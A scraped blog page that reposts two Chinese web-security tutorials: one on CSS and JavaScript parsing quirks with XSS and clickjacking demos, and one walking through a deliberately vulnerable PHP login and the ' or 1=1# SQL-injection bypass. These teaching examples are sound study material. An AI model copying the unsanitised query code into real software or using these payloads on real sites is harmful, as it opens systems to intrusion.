<p><a href="http://drops.wooyun.org/login" title="登录" target="_blank">登录</a></p>
<p>像一朵乌云一样成长</p>
<ul>
<li><a href="http://drops.wooyun.org/" title="WooYun知识库" target="_blank">首页</a></li>
<li><a href="http://www.wooyun.org/" target="_blank">WooYun</a></li>
<li><a href="http://zone.wooyun.org/" target="_blank">Zone</a></li>
<li><a href="http://drops.wooyun.org/newsend" target="_blank">投稿</a>
<a href="http://drops.wooyun.org/" title="首页" target="_blank">首页</a> » <a href="http://drops.wooyun.org/category/tips" title="查看 技术分享 中的全部文章" target="_blank">技术分享</a> » Browser Security-css、javascript</li>
</ul>
<h2 id="-browser-security-css-javascript-http-drops-wooyun-org-tips-150-permanent-link-to-browser-security-css-javascript-"><a href="http://drops.wooyun.org/tips/150" title="Permanent Link to Browser Security-css、javascript" target="_blank">Browser Security-css、javascript</a></h2>
<p>0人收藏 <a href="">收藏</a></p>
<p>2013/06/19 18:55  | <a href="http://drops.wooyun.org/author/瞌睡龙" title="由 瞌睡龙 发布" target="_blank">瞌睡龙</a>  | <a href="http://drops.wooyun.org/category/tips" title="查看 技术分享 中的全部文章" target="_blank">技术分享</a>  | <a href="">占个座先</a></p>
<h3 id="-css-">层叠样式表（css）</h3>
<p>调用方式有三种：
1 用<style> 2 通过<link rel=stylesheet>，或者使用style参数。 3 XML（包括XHTML）可以通过&lt;?xml-stylesheet href=...?&gt;</p>
<p>浏览器进行解析的时候会先HTML解析再做CSS解析，所以下面的代码会出错：</p>
<style> some_descriptor { background: url('http://www.example.com/</style><h1 > Gotcha!'); } </style>

<p>字符编码：</p>
<p>为了保证在css中可以使用可能产生问题的字符，css提供了一种方式由反斜杠()加六位十六进制数字。</p>
<p>字符e可以编码成\65 \065 \000065，当后面紧跟的字符也是十六进制字符中的一种的时候，只有最后一个才是对的。</p>
<p>例如teak编码成 t\65ak 不会正常，因为会解码时会把\65a当成一个字符。</p>
<p>为了避免上述情况可以编码以后加一个空白符，例如：t\65 k。</p>
<p>很多CSS解析器同样会解析引号之外的字符串。</p>
<p>下面两个代码IE下相同</p>
<p><A STYLE='color: expression\028 alert \028 1 \029 \029'> <A STYLE='color: expression(alert(1))'></p>
<h3 id="fuzzing">Fuzzing</h3>
<p>CSS的解析规则与HTML和JavaScript在几个方面不同。</p>
<p>JavaScript在语法错误的时候，整个代码都会被忽略，而CSS解析错误时，浏览器尝试忽略错误的代码。</p>
<p>这点上跟HTML比较类似，因为HTML语法错误时，浏览器会尝试修复并展现出来，</p>
<p>@符号用来在CSS样式表中定义一个特殊属性，定义字符集（@charset）或者media的样式（@media）。</p>
<p>导入外部样式（@import）或外部字体（@font-face）或命名空间（@namespace）或定义一个演示文件（@page）。</p>
<p>定义字符集的时候，可以定义一个多字节字符集（如：SHIFT-JIS，BIG5，EUC-JP，EUC-KR或GB2312）可能会使反斜线失效：
@charset &quot;GB-2312&quot;; /*{ content:&quot;a%90\&quot;; color:red; z:k&quot;; }</p>
<p>会解析为：</p>
<p>@charset &quot;GB-2312&quot;; /*{ content:&quot;a撞&quot;; color:red; z:k&quot;; }</p>
<p>还有一种时UTF-7字符：</p>
<p>@charset &quot;UTF-7&quot;; /*{ content:&quot;a+ACIAOw- color:red; z:k&quot;; }</p>
<p>会解析为：</p>
<p>@charset &quot;UTF-7&quot;; /*{ content:&quot;a&quot;; color:red; z:k&quot;; }</p>
<p>定义@charset在IE中并非这一种定义UTF-7的方式：</p>
<p>+/v8- /*{ content:&quot;a+ACIAOw- color:red; z:k&quot;; }</p>
<p>在一些浏览器中导入的时候可以定义字符集：</p>
<link rel=stylesheet charset=UTF-7 src=stylesheet>

<p>CSS的选择器是非常有趣的部分，他可以包含字符串，表达式，函数。选择器也可以由多行组成：</p>
<p>CSS中的声明时一个 属性/值 对里面的规则集，通常形式如下：
property: value;</p>
<p>property是一个关键字，包括字母数字破折号，和大于0x7F的字符，也有绕过的方式：</p>
<p>-moz-binding与\2d moz\2d binding相等。</p>
<p>IE中property没有严格遵守这个规则，如果一个属性包含多个字，只有第一个字将被使用，其他的都会忽略：</p>
<p>a b c: value; a: value;</p>
<p>上面两个规则是等效的。 并且IE中:可以替换为=</p>
<p>a = value; a: value;</p>
<p>上面两个也是等效的。</p>
<p>同样重要的是IE允许多行的字符串，URL，选择器。</p>
<p>CSS最明显的局限性是，他本身不是一种编程语言，而是一种语言风格，他没有任何的编程逻辑。</p>
<p>他很难不借助于JavaScript进行攻击，下面主要讨论的是完全基于CSS不依赖于其他脚本语言的攻击。</p>
<p>整体的逻辑：
element:condition{    action;    }</p>
<p>element可以为任意值，condition为CSS选择器，如:visited，:active，:hover，:selected。 事件选择器：</p>
<p>1 :hover 悬停鼠标在一个元素。 2 :active 点击一个元素。 3 :focus 光标放在一个元素上。</p>
<p>CSS造成点击劫持：</p>
<style> iframe{ filter:alpha(opacity=0);opacity: 0; position: absolute;top: 0px;left: 0px; height: 300px;width: 250px; } img{ position: absolute;top: 0px;left: 0px; height: 300px;width: 250px; } </style> <img src="用户看到的图片"> <iframe src="用户实际操作的页面"></iframe>

点击劫持的防御方法一是添加X-FRAME-OPTIONS:NEVER头，另外一种方式是利用JavaScript：

<body> <script> if(top!=self) document.write('<plaintext>'); </script>

两种方式都有局限性，之前发过点击劫持的文档了，详见：[http://drops.wooyun.org/tips/104](http://drops.wooyun.org/tips/104)

如下代码是一个有效的CSS2的代码，并且在Firefox，Safari，Chrome，Opera，IE7，IE8，IE9中没有影响，但是在IE6中，可执行代码：
<style> foo[bar|="} /*{xss: expression(alert(1));} x{"]{   color:red; } </style>

<p>以下代码中的color可以编码为c\olor，\c\o\l\or，c\6f l\06f r 。</p>
<p>/*{ color: red; }</p>
<h3 id="-">浏览器脚本语言</h3>
<p>解析javascript的时候以下两段代码不相同：
代码一 代码二 &amp;/#x3cscript&gt; var my_variable1 = 1; var my_variable2 = &amp;/#x3c/script&gt; &amp;/#x3cscript&gt; 2; &amp;/#x3c/script&gt; &amp;/#x3cscript&gt; var my_variable1 = 1; var my_variable2 = 2; &amp;/#x3c/script&gt;</p>
<p>这是因为</p>
<script>
在解析之前并没有链接起来，相反，代码一中的第一个script标签会引起错误。

从而导致整个标签被忽略，所有标签内的代码都无法执行。

在JS中有两种定义函数的方式：
var aaa=function(){...} function aaa(){...}

var 方式定义的函数，不能先调用函数，后声明，只能先声明函数，然后调用。

function方式定义函数可以先调用，后声明。
<script>   //aaa();这样调用就会出错   var aaa = function(){     alert("A");   }   aaa();//这样就不会出错   //先调用后声明   bbb();   function bbb(){     alert("bb");   }   </script>

<p>出于历史原因，某些HTML元素</p>
<p>（<IMG>，<FORM>，<EMBED>，<object>，<APPLET>）
的名字也直接映射到文档的命名空间，如下面的代码片段所示：</p>
<p><img name="hello" src="http://www.example.com/"> <script> alert(document.hello.src); </script></p>
<p>DOM操作：</p>
<p>document.getElementById(&quot;output&quot;).innerHTML = &quot;<b>Hi mom!</b>&quot;;</p>
<p>向id为output的标签里插入</p>
<p><b>Hi mom!</b>
。 采用.innerHTML插入数据时，必须为完整的数据块，比如下面的代码：</p>
<p>some_element.innerHTML = &quot;<b>Hi&quot;; some_element.innerHTML += &quot; mom!</b><i>&quot;;</p>
<p>等同于下面的代码：</p>
<p>some_element.innerHTML = &quot;<b>Hi</b> mom!<i></i>&quot;;</p>
<p>DOM操作时，其本身会对一些字符做解码处理，如下代码：</p>
<p><textarea style="display:none" id="json"> {   &quot;name&quot;:&quot;Jack&quot;&quot;,   &quot;country&quot;:&quot;China&quot; } </textarea> My name is :<span id="me">loading...</span> <script> function $(id){   return document.getElementById(id); } var data=$(&quot;json&quot;).value; alert(data); var profile=eval(&quot;(&quot;+data+&quot;)&quot;);//把string转成object方便操作 $(&quot;me&quot;).innerHTML = profile.name; </script></p>
<p>可以看到alert出的data数据为</p>
<p>{      &quot;name&quot;:&quot;Jack&quot;&quot;,      &quot;country&quot;:&quot;China&quot; }</p>
<p>下面的例子是使用getAttribute时也会解码：</p>
<p><img id="pic" src="http://www.baidu.com/img/baidu_sylogo1.gif" bigpic="http://baidu.com&quot;&gt;&lt;img src=1 onerror=alert(1)&gt;&lt;i b =" onclick="test()"> <div id="bigimage"> </div> <script> function $(id){   return document.getElementById(id); } function test(){   big=$(&quot;pic&quot;).getAttribute(&quot;bigpic&quot;);//big此时为：<a href="http://baidu.com&quot;&gt;" target="_blank">http://baidu.com&quot;&gt;</a><img src=1 onerror=alert(1)><i b =   $("bigimage").innerHTML="<img src=\"" + big + "\"/>"; } </script></p>
<h3 id="javascript-">javascript编码</h3>
<p>javascript支持多种字符编码方式：
1 C语言的编码，\b表示退格，\t表示水平制表符等等，公认的ECMAScript编码。 2 三位数字：用反斜杠加八位8进制来表示，如\145可表示字符e，该语法不属于ECMAScript，但是基本所有的浏览器都支持。 3 两位数字：用反斜杠加x加八位16进制表示，如\x65可表示字符e，同样不属于ECMAScript，但是在解析底层，C语言中有很好的支持。 4 四位数字：Unicode编码，十六位16进制表示，如\u0065可表示字符e，属于ECMAScript编码。</p>
<p>需要注意的是组后一种编码方式不止在字符串中才可以表示，如下代码也可正常的执行（但是不可替代括号与引号）：</p>
<script> \u0061lert("This displays a message!"); </script>

<h3 id="fuzzing">Fuzzing</h3>
<p>JavaScript中，window对象是一个全局变量，并且默认定义的变量都为全局变量，window下的方法可以直接访问：</p>
<script type="text/javascript"> alert(1); window.alert(1); window.alert(window.alert); </script>

<p>并且可重写：</p>
<script type="text/javascript"> function alert() {} alert(1) </script>

<p>定义数组的两种方式：</p>
<script type="text/javascript"> x=[1,alert,{},[],/a/]; alert(x[4]); </script>

<p>默认返回最后一个：</p>
<script type="text/javascript"> objLiteral={'objProperty':123}; alert(objLiteral[0,1,2,3,'objProperty']); </script> <script type="text/javascript"> objLiteral={'objProperty':123}; alert(objLiteral[(0,1,2,3,(0,'objProperty'))]); </script>

<p>JavaScript中定义字符串除了&#39;string&#39;，&quot;string&quot;方式之外，还有其他的方式：</p>
<script type="text/javascript"> alert(/I am a string/+''); alert(/I am a string/.source); alert(/I am a string/['source']); alert(['I am a string']+[]) </script>

<p>第一个alert中是一个正则表达式加一个空字符串，JavaScript会把正则强制转为字符串。 第二个alert中使用了标准的正则对象的source属性，返回结果为正则匹配完的字符串，第三个相同是属性的另外一种访问方式。 第三个alert中是利用了访问数组时如果不是指定的访问一个元素，会自动调用toString()方法，转为字符串。 还有一种非标准的使用字符串的方式（IE8，Safari，Opera，Firefox和Chrome已经支持），使用类似数组的方式：</p>
<script type="text/javascript"> alert('abcdefg'[0]); </script>

<p>火狐当中对函数名的规范非常的宽泛：</p>
<script type="text/javascript"> window.function=function function(){return function function() {return function function(){alert('Works in Firefox')}()}()}() </script>

<p>JavaScript支持多行的字符串，当一\结尾时，下一行的字符串会接着上一行的结尾：</p>
<script type="text/javascript"> alert("this is a \ \ \ \ \ string"); </script>

<p>似乎所有的JavaScript引擎都支持函数之前的运算符，如：+，-，~，++，--，!，运算符也可写在typeof和void之前。</p>
<script type="text/javascript"> !~+-++alert(1) </script> <script type="text/javascript"> void~void~typeof~typeof--alert(2) </script> <script type="text/javascript"> alert(3)/abc </script>

<p>最新的Chrome与Safari前两个已经不会执行了。 查看控制台可以看到三个js其实都是报错了的，前两个是由于alert函数返回的是undefined，进行++和--操作的时候是非法的。 最后一个是试图用alert函数除以一个未声明的变量，先执行alert函数后再除的时候报错。
<strong>Tags:</strong> <a href="http://drops.wooyun.org/tag/javascript" target="_blank">javascript</a>, <a href="http://drops.wooyun.org/tag/浏览器" target="_blank">浏览器</a></p>
<p>版权声明：未经授权禁止转载 <a href="http://drops.wooyun.org/author/瞌睡龙" title="由 瞌睡龙 发布" target="_blank">瞌睡龙</a>@<a href="http://drops.wooyun.org/" target="_blank">乌云知识库</a>
分享到： <a href="&quot;分享到QQ空间&quot;"></a> <a href="&quot;分享到新浪微博&quot;"></a> <a href="&quot;分享到腾讯微博&quot;"></a> <a href="&quot;分享到人人网&quot;"></a> <a href="&quot;分享到网易微博&quot;"></a> <a href="&quot;累计分享0次&quot;">0</a></p>
<h3 id="-">相关日志</h3>
<ul>
<li><a href="http://drops.wooyun.org/papers/146" target="_blank">Browser Security-基本概念</a></li>
<li><a href="http://drops.wooyun.org/tips/147" target="_blank">Browser Security-超文本标记语言（HTML）</a></li>
<li><a href="http://drops.wooyun.org/tips/151" target="_blank">Browser Security-同源策略、伪URL的域</a></li>
<li><a href="http://drops.wooyun.org/papers/526" target="_blank">浏览器安全（一）</a></li>
<li><a href="http://drops.wooyun.org/tips/188" target="_blank">详解XMLHttpRequest的跨域资源共享</a></li>
<li><a href="http://drops.wooyun.org/tips/134" target="_blank">针对性攻击与移动安全漏洞</a>
上一篇:<a href="http://drops.wooyun.org/tips/151" target="_blank">Browser Security-同源策略、伪URL的域</a></li>
</ul>
<p>下一篇:<a href="http://drops.wooyun.org/tips/147" target="_blank">Browser Security-超文本标记语言（HTML）</a></p>
<h3 id="-">发表评论</h3>
<p><a href="">点击这里取消回复。</a></p>
<p>您必须 <a href="http://drops.wooyun.org/login" target="_blank">登陆</a> 后才能发表评论。</p>
<h3 id="-">订阅更新</h3>
<ul>
<li><a href="http://drops.wooyun.org/feed" title="点击订阅" target="_blank"><img src="" alt=""></a></li>
</ul>
<h3 id="-">分类</h3>
<ul>
<li><a href="http://drops.wooyun.org/category/papers" title="漏洞分析" target="_blank">漏洞分析</a> (40)</li>
<li><a href="http://drops.wooyun.org/category/tips" title="技术分享" target="_blank">技术分享</a> (57)</li>
<li><a href="http://drops.wooyun.org/category/tools" title="工具收集" target="_blank">工具收集</a> (5)</li>
<li><p><a href="http://drops.wooyun.org/category/news" title="业界资讯" target="_blank">业界资讯</a> (3)</p>
<h3 id="-">最新日志</h3>
</li>
<li><p><a href="http://drops.wooyun.org/tips/688" title="Flash CSRF" target="_blank">Flash CSRF</a></p>
</li>
<li><a href="http://drops.wooyun.org/tips/689" title="XSS与字符编码的那些事儿 —科普文" target="_blank">XSS与字符编码的那些事儿 —科普文</a></li>
<li><a href="http://drops.wooyun.org/papers/680" title="Zabbix SQL Injection/RCE – CVE-2013-5743" target="_blank">Zabbix SQL Injection/RCE – CVE-2013-5743</a></li>
<li><a href="http://drops.wooyun.org/papers/679" title="CDN流量放大攻击思路" target="_blank">CDN流量放大攻击思路</a></li>
<li><a href="http://drops.wooyun.org/news/674" title="从丝绸之路到安全运维（Operational Security）与风险控制（Risk Management） 上集" target="_blank">从丝绸之路到安全运维（Operational Security）与风险控制（Risk Management） 上集</a></li>
<li><a href="http://drops.wooyun.org/tips/662" title="攻击JavaWeb应用[8]-后门篇" target="_blank">攻击JavaWeb应用[8]-后门篇</a></li>
<li><a href="http://drops.wooyun.org/papers/660" title="php4fun.sinaapp.com PHP挑战通关攻略" target="_blank">php4fun.sinaapp.com PHP挑战通关攻略</a></li>
<li><a href="http://drops.wooyun.org/papers/653" title="搭建基于Suricata+Barnyard2+Base的IDS前端Snorby" target="_blank">搭建基于Suricata+Barnyard2+Base的IDS前端Snorby</a></li>
<li><a href="http://drops.wooyun.org/tools/655" title="GPU破解神器Hashcat使用简介" target="_blank">GPU破解神器Hashcat使用简介</a></li>
<li><a href="http://drops.wooyun.org/tips/649" title="内网渗透应用 跨vlan渗透的一种思路" target="_blank">内网渗透应用 跨vlan渗透的一种思路</a></li>
</ul>
<h3 id="-">最新评论</h3>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>c2y2 在 <a href="http://drops.wooyun.org/tips/689#comment-1883" target="_blank">XSS与字符编码的那些事儿 ---科普文</a>
谢谢</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>Evi1c0de 在 <a href="http://drops.wooyun.org/tips/573#comment-1877" target="_blank">如何用意念获取附近美女的手机号码</a>
连接CMCC跳转到登陆页面 右键源码 修改即可</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>牛牛 在 <a href="http://drops.wooyun.org/tips/688#comment-1871" target="_blank">Flash CSRF</a>
支持一下呵呵</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>luwikes 在 <a href="http://drops.wooyun.org/papers/178#comment-1870" target="_blank">JBoss安全问题总结</a>
mark</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>NgInx 在 <a href="http://drops.wooyun.org/tips/688#comment-1869" target="_blank">Flash CSRF</a>
好吧，基佬，顶你一个，不错。</p>
<ul>
<li><a href="">下一页 »</a>
Powered by <a href="http://wordpress.org/" target="_blank">WordPress</a> | GZai Theme by <a href="http://huaidan.org/" title="GZai Theme produced by 鬼仔" target="_blank">鬼仔</a>
<a href="http://tongji.baidu.com/hm-web/welcome/ico?s=9fc41da6a2322bdd80563c9d5a4bdb1d" target="_blank"><img src="" alt=""></a></li>
</ul>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/Scripts/">Scripts</a></li></span></span> | <span class="tags">Tagged <a href="/tags/Scripts/" class="label label-primary">Scripts</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-Scripts--BrowserSecurity-css、javascript/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-Scripts--BrowserSecurity-css、javascript" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-SQL注入--利用SQL注入漏洞登录后台/">利用SQL注入漏洞登录后台</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-安全-SQL注入--利用SQL注入漏洞登录后台/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-sql-">利用SQL注入漏洞登录后台</h1>
<h3 id="-">分享到</h3>
<ul>
<li><a href="">一键分享</a></li>
<li><a href="">QQ空间</a></li>
<li><a href="">新浪微博</a></li>
<li><a href="">百度搜藏</a></li>
<li><a href="">人人网</a></li>
<li><a href="">腾讯微博</a></li>
<li><a href="">百度相册</a></li>
<li><a href="">开心网</a></li>
<li><a href="">腾讯朋友</a></li>
<li><a href="">百度贴吧</a></li>
<li><a href="">豆瓣网</a></li>
<li><a href="">搜狐微博</a></li>
<li><a href="">百度新首页</a></li>
<li><a href="">QQ好友</a></li>
<li><a href="">和讯微博</a></li>
<li><a href="">更多...</a></li>
</ul>
<p><a href="">百度分享</a></p>
<p>用户名：  密码：   <a href="http://bbs.php100.com/register.php" target="_blank">新用户注册</a></p>
<p><a href="http://bbs.php100.com/read-htm-tid-693.html" target="_blank">PHP100三不条约</a> <a href="http://www.php100.com/cms/com/intome.php?tg" target="_blank">投稿</a></p>
<p><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2012/0210/data/rssmap.html" title="rss" target="_blank"><img src="" alt="rss"></a></p>
<p><a href="http://www.php100.com/" target="_blank"><img src="" alt="PHP100中文网-中国第一档PHP资源分享门户"></a></p>
<p><a href="http://www.php100.com/" target="_blank">网站首页</a> | <a href="http://www.php100.com/html/itnews/" target="_blank">业界资讯</a> | <a href="http://www.php100.com/html/webkaifa/" target="_blank">相关开发资料</a> | <a href="http://www.php100.com/html/open-php/" target="_blank">IT开源报道</a> | <a href="http://www.php100.com/html/download/" target="_blank">相关下载</a> | <a href="http://www.php100.com/html/shipinjiaocheng/" target="_blank">视频教程</a> | <a href="http://www.php100.com/job.php" target="_blank">PHP求职招聘</a> | <a href="http://www.php100.com/waibao.php" target="_blank">项目供求</a> | <a href="http://www.php100.com/share.php" target="_blank">资源共享</a> | <a href="http://bbs.php100.com/" target="_blank">PHP100中文论坛</a></p>
<p><strong><a href="http://www.php100.com/html/webkaifa/apache/" target="_blank">Apache&amp;Nginx</a> | <a href="http://www.php100.com/html/webkaifa/DIV_CSS/" target="_blank">DIVCSS</a> | <a href="http://www.php100.com/html/webkaifa/PHP/" target="_blank">PHP</a> | <a href="http://www.php100.com/html/webkaifa/database/" target="_blank">DB</a> | <a href="http://www.php100.com/html/webkaifa/javascript/" target="_blank">JS&amp;JQuery</a> | <a href="http://www.php100.com/html/webkaifa/HTML5/" target="_blank">HTML5</a> | <a href="http://www.php100.com/html/webkaifa/Android/" target="_blank">Android</a> | <a href="http://www.php100.com/html/webkaifa/python/" target="_blank">python</a> | <a href="http://www.php100.com/html/webkaifa/ajax/" target="_blank">Ajax</a> | <a href="http://www.php100.com/html/webkaifa/xml/" target="_blank">XML&amp;JSON</a> | <a href="http://www.php100.com/html/webkaifa/Linux/" target="_blank">Linux</a> | <a href="http://www.php100.com/html/webkaifa/zhengzebiaodashi/" target="_blank">正则</a> |</strong>
<a href="http://www.chuangen.com/php_training.php" target="_blank"><img src="" alt=""></a></p>
<p><a href="http://www.php100.com/" target="_blank">首页</a> &gt; <a href="http://www.php100.com/html/webkaifa/" target="_blank">开发资料</a> &gt; <a href="http://www.php100.com/html/webkaifa/PHP/" target="_blank">PHP</a> &gt; <a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/" target="_blank">PHP应用</a> &gt; 正文</p>
<h1 id="-sql-">利用SQL注入漏洞登录后台</h1>
<p>发布时间：2012-02-10 09:42:17   来源：cnblogs.com/hongfei   评论：<a href="">0</a> 点击：12173 次 【字号：<a href="">大</a> <a href="">中</a> <a href="">小</a>】</p>
<p><a href="&quot;分享到QQ空间&quot;">QQ空间</a> <a href="&quot;分享到新浪微博&quot;">新浪微博</a> <a href="&quot;分享到腾讯微博&quot;">腾讯微博</a> <a href="&quot;分享到人人网&quot;">人人网</a> <a href="&quot;分享到豆瓣网&quot;">豆瓣网</a> <a href="&quot;分享到百度空间&quot;">百度空间</a> <a href="&quot;分享到百度搜藏&quot;">百度搜藏</a> <a href="&quot;分享到开心网&quot;">开心网</a> <a href="&quot;分享到复制网址&quot;">复制</a> 更多 <a href="&quot;累计分享8次&quot;">8</a>
题记：工作需要，得好好补习下关于WEB安全方面的相关知识，故撰此文，权当总结，别无它意。读这篇文章，我假设读者有过写SQL语句的经历，或者能看得懂SQL语句　　早在02年，国外关于SQL注入漏洞的技术文章已...</p>
<p>题记：工作需要，得好好补习下关于WEB安全方面的相关知识，故撰此文，权当总结，别无它意。读这篇文章，我假设读者有过写SQL语句的经历，或者能看得懂SQL语句</p>
<p>早在02年，国外关于SQL注入漏洞的技术文章已经很多，而国内在05年左右才开始的。</p>
<p>如今，谈SQL注入漏洞是否已是明日黄花，国内大大小小的网站都已经补上漏洞。但，百密必有一疏，入侵是偶然的，但安全绝对不是必然的。</p>
<p>前些天，网上传得沸沸扬扬的“拖库”事件给我们敲响了安全警钟。</p>
<p>在开发网站的时候，出于安全考虑，需要过滤从页面传递过来的字符。通常，用户可以通过以下接口调用数据库的内容：URL地址栏、登陆界面、留言板、搜索框等。这往往给骇客留下了可乘之机。轻则数据遭到泄露，重则服务器被拿下。</p>
<p>现在，很多网站开发人员知其然而不知其所以然，小弟也是，所以赶紧恶补下，总结如学习内容。希望对初学者能够起到抛砖引玉的作用。</p>
<p><strong>一、SQL注入的步骤</strong></p>
<p>a) 寻找注入点(如：登录界面、留言板等)</p>
<p>b) 用户自己构造SQL语句(如：’ or 1=1/#，后面会讲解)</p>
<p>c) 将sql语句发送给数据库管理系统(DBMS)</p>
<p>d) DBMS接收请求，并将该请求解释成机器代码指令，执行必要的存取操作</p>
<p>e) DBMS接受返回的结果，并处理，返回给用户</p>
<p>因为用户构造了特殊的SQL语句，必定返回特殊的结果(只要你的SQL语句够灵活的话)。</p>
<p>下面，我通过一个实例具体来演示下SQL注入</p>
<p><strong>二、SQL注入实例详解</strong>(以上测试均假设服务器未开启magic_quote_gpc)</p>
<p>1) 前期准备工作</p>
<p>先来演示通过SQL注入漏洞，登入后台管理员界面</p>
<p>首先，创建一张试验用的数据表：</p>
<p>CREATE TABLE <code>users</code> (</p>
<p><code>id</code> int(11) NOT NULL AUTO_INCREMENT,</p>
<p><code>username</code> varchar(64) NOT NULL,</p>
<p><code>password</code> varchar(64) NOT NULL,</p>
<p><code>email</code> varchar(64) NOT NULL,</p>
<p>PRIMARY KEY (<code>id</code>),</p>
<p>UNIQUE KEY <code>username</code> (<code>username</code>)</p>
<p>) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;</p>
<p>添加一条记录用于测试：</p>
<p>INSERT INTO users (username,password,email)</p>
<p>VALUES(&#39;MarcoFly&#39;,md5(&#39;test&#39;),&#39;marcofly@test.com&#39;);</p>
<p>接下来，贴上登录界面的源代码：</p>
<html>
<head>
<title>Sql注入演示</title>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
</head>

<body >
<form action="validate.php" method="post">
  <fieldset >
    <legend>Sql注入演示</legend>
    <table>
      <tr>
        <td>用户名：</td>
        <td><input type="text" name="username"></td>
      </tr>
      <tr>
        <td>密&nbsp;&nbsp;码：</td>
        <td><input type="text" name="password"></td>
      </tr>
      <tr>
        <td><input type="submit" value="提交"></td>
        <td><input type="reset" value="重置"></td>
      </tr>
    </table>
  </fieldset>
</form>
</body>
</html>

<p>附上效果图：
<img src="" alt="\"></p>
<p>当用户点击提交按钮的时候，将会把表单数据提交给validate.php页面，validate.php页面用来判断用户输入的用户名和密码有没有都符合要求(这一步至关重要，也往往是SQL漏洞所在)</p>
<p>代码如下：</p>
<html>
<head>
<title>登录验证</title>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
</head>

<body>
&lt;?php

       $conn=@mysql_connect(&quot;localhost&quot;,&#39;root&#39;,&#39;&#39;) or die(&quot;数据库连接失败！&quot;);;

       mysql_select_db(&quot;injection&quot;,$conn) or die(&quot;您要选择的数据库不存在&quot;);

       $name=$_POST[&#39;username&#39;];

       $pwd=$_POST[&#39;password&#39;];

       $sql=&quot;select /* from users where username=&#39;$name&#39; and password=&#39;$pwd&#39;&quot;;

       $query=mysql_query($sql);

       $arr=mysql_fetch_array($query);

       if(is_array($arr)){

              header(&quot;Location:manager.php&quot;);

       }else{

              echo &quot;您的用户名或密码输入有误，<a href=\"Login.php\">请重新登录！</a>&quot;;

       }

?&gt;
</body>
</html>

<p>注意到了没有，我们直接将用户提交过来的数据(用户名和密码)直接拿去执行，并没有实现进行特殊字符过滤，待会你们将明白，这是致命的。</p>
<p>代码分析：如果，用户名和密码都匹配成功的话，将跳转到管理员操作界面(manager.php)，不成功，则给出友好提示信息。</p>
<p>登录成功的界面：
<img src="" alt="\"></p>
<p>登录失败的提示：</p>
<p><img src="" alt="\"></p>
<p>到这里，前期工作已经做好了，接下来将展开我们的重头戏：SQL注入</p>
<p>2) 构造SQL语句</p>
<p>填好正确的用户名(marcofly)和密码(test)后，点击提交，将会返回给我们“欢迎管理员”的界面。</p>
<p>因为根据我们提交的用户名和密码被合成到SQL查询语句当中之后是这样的：</p>
<p>select /* from users where username=&#39;marcofly&#39; and password=md5(&#39;test&#39;)</p>
<p>很明显，用户名和密码都和我们之前给出的一样，肯定能够成功登陆。但是，如果我们输入一个错误的用户名或密码呢?很明显，肯定登入不了吧。恩，正常情况下是如此，但是对于有SQL注入漏洞的网站来说，只要构造个特殊的“字符串”，照样能够成功登录。</p>
<p>比如：在用户名输入框中输入:’ or 1=1/#,密码随便输入，这时候的合成后的SQL查询语句为：</p>
<p>select /* from users where username=&#39;&#39; or 1=1/#&#39; and password=md5(&#39;&#39;)</p>
<p>语义分析：“/#”在mysql中是注释符，这样井号后面的内容将被mysql视为注释内容，这样就不会去执行了，换句话说，以下的两句sql语句等价：</p>
<p>select /* from users where username=&#39;&#39; or 1=1/#&#39; and password=md5(&#39;&#39;)</p>
<p>等价于</p>
<p>select /* from users where username=&#39;&#39; or 1=1</p>
<p>因为1=1永远是都是成立的，即where子句总是为真，将该sql进一步简化之后，等价于如下select语句：</p>
<p>select /* from users</p>
<p>没错，该sql语句的作用是检索users表中的所有字段</p>
<p>小技巧：如果不知道’ or 1=1/#中的单引号的作用，可以自己echo 下sql语句，就一目了然了。</p>
<p>看到了吧，一个经构造后的sql语句竟有如此可怕的破坏力，相信你看到这后，开始对sql注入有了一个理性的认识了吧~</p>
<p>没错，SQL注入就是这么容易。但是，要根据实际情况构造灵活的sql语句却不是那么容易的。有了基础之后，自己再去慢慢摸索吧。</p>
<p>有没有想过，如果经由后台登录窗口提交的数据都被管理员过滤掉特殊字符之后呢?这样的话，我们的万能用户名’ or 1=1/#就无法使用了。但这并不是说我们就毫无对策，要知道用户和数据库打交道的途径不止这一条。
-</p>
<p>（责任编辑：phpcms）
本文关键字：</p>
<ul>
<li><a href="http://www.php100.com/index.php?m=content&amp;c=tag&amp;catid=21&amp;tag=%C0%FB%D3%C3" target="_blank">利用</a> <a href="http://www.php100.com/index.php?m=content&amp;c=tag&amp;catid=21&amp;tag=%D7%A2%C8%EB" target="_blank">注入</a> <a href="http://www.php100.com/index.php?m=content&amp;c=tag&amp;catid=21&amp;tag=%C2%A9%B6%B4" target="_blank">漏洞</a></li>
</ul>
<p><strong>上一篇：</strong><a href="http://www.php100.com/html/webkaifa/javascript/2012/0210/9802.html" target="_blank">JS 调用 Flash 方法</a>
<strong>下一篇：</strong><a href="http://www.php100.com/html/webkaifa/PHP/PHPyingyong/2012/0210/9804.html" target="_blank">几个 PHP 的“魔术常量”</a></p>
<ul>
<li>14 <img src="" alt="">
震惊</li>
<li>14 <img src="" alt="">
不解</li>
